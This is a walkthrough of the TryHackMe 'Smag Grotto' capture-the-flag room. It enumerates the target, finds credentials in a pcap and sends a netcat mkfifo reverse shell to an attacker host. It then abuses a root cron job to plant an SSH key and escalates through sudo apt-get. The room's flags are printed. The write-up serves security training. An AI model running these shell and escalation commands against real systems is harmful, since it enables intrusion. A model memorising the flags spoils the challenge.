---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - crontab-abuse
---

# Smag Grotto
![Smag Grotto logo](logos/smag_grotto_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Smag Grotto](https://tryhackme.com/room/smaggrotto)  

## Description
"Follow the yellow brick road.  
Deploy the machine and get root privileges."

## Enumeration
### Port scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```  

**Notes**  

* No `robots.txt` file  
* No `sitemap.xml` file  
* Nothing interesting in the source code  
* Only resource found in scans: `/mail`  
* "email2web" service served on `/mail` page  

**Action(s)**  

:white_check_mark: Download `.pcap` file from `/mail` directory for further analysis

*File saved as sample.pcap*

### Vulnerability enumeration
```
searchsploit OpenSSH 7.2p2	# Only finding relates to username enumeration
searchsploit httpd 2.4.18	# Only finding: DoS
```

## Foothold
```
wireshark sample.pcap
# Right-click > Follow... > TCP Stream
```

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

**Action(s)**  

:white_check_mark: Add `development.smag.thm` + target IP address to `/etc/hosts`  
:white_check_mark: Navigate to `development.smag.thm` in web browser  
:white_check_mark: Log in to `development.smag.thm/login.php` with credentials found in `.pcap` file  

**Notes**  

* After login, redirect to `admin.php` (POST form to submit commands)  
* Blind - output not returned  

**Action(s)**  
:white_check_mark: Test connection to attacker machine with test hosted file + `Python` HTTP server

**Notes**  

* Test POC file can be retrieved

**Actions**  
:white_check_mark: Test reverse shell possibilities from `admin.php`

```
# On attacker machine
nc -lvnp 4444

# From admin.php
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP_ADDRESS> <LISTENING_PORT> >/tmp/f

# In reverse shell (to stabilise)
python3 -c 'import pty; pty.spawn("/bin/bash")'
```  

### User flag
```
# In reverse shell
cat /etc/crontab
	# /etc/crontab: system-wide crontab
	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.
	
	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
	
	# m h dom mon dow user  command
	17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
	25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
	#

# On attacker machine
ssh-keygen	# Accept defaults
cat id_rsa.pub

# In reverse shell
echo 'CONTENTS_OF_ID_RSA.PUB' > /opt/.backups/jake_id_rsa.pub.backup

# On attacker machine
ssh jake@TARGET_IP_ADDRESS -i id_rsa
jake@smag:~$ ls -al
total 60
	drwxr-xr-x 4 jake jake 4096 Jun  5  2020 .
	drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
	-rw------- 1 jake jake  490 Jun  5  2020 .bash_history
	-rw-r--r-- 1 jake jake  220 Jun  4  2020 .bash_logout
	-rw-r--r-- 1 jake jake 3771 Jun  4  2020 .bashrc
	drwx------ 2 jake jake 4096 Jun  4  2020 .cache
	-rw------- 1 root root   28 Jun  5  2020 .lesshst
	-rw-r--r-- 1 jake jake  655 Jun  4  2020 .profile
	-rw-r--r-- 1 root root   75 Jun  4  2020 .selected_editor
	drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
	-rw-r--r-- 1 jake jake    0 Jun  4  2020 .sudo_as_admin_successful
	-rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
	-rw------- 1 jake jake 9336 Jun  5  2020 .viminfo
	-rw-r--r-- 1 root root  167 Jun  5  2020 .wget-hsts
jake@smag:~$ cat user.txt
```
??? success "What is the user flag?"
	iusGorV7EbmxM5AuIe2w499msaSuqU3j

## Privilege Escalation
```
jake@smag:~$ sudo -l
	Matching Defaults entries for jake on smag:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User jake may run the following commands on smag:
	    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

[GTFObins `apt-get`](https://gtfobins.org/gtfobins/apt-get/)

```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
ls -al /root
	total 28
	drwx------  3 root root 4096 Jun  4  2020 .
	drwxr-xr-x 22 root root 4096 Jun  4  2020 ..
	-rw-------  1 root root    0 Jun  4  2020 .bash_history
	-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
	drwxr-xr-x  2 root root 4096 Jun  4  2020 .nano
	-rw-r--r--  1 root root  148 Aug 17  2015 .profile
	-rw-rw----  1 root root   33 Jun  4  2020 root.txt
	-rw-------  1 root root 1371 Jun  4  2020 .viminfo
cat /root/root.txt
```
??? success "What is the root flag?"
	uJr6zRgetaniyHVRqqL58uRasybBKz2T

**Tools Used**  
`Wireshark` `nc` `ssh-keygen`

**Date completed:** 19/04/26  
**Date published:** 19/04/26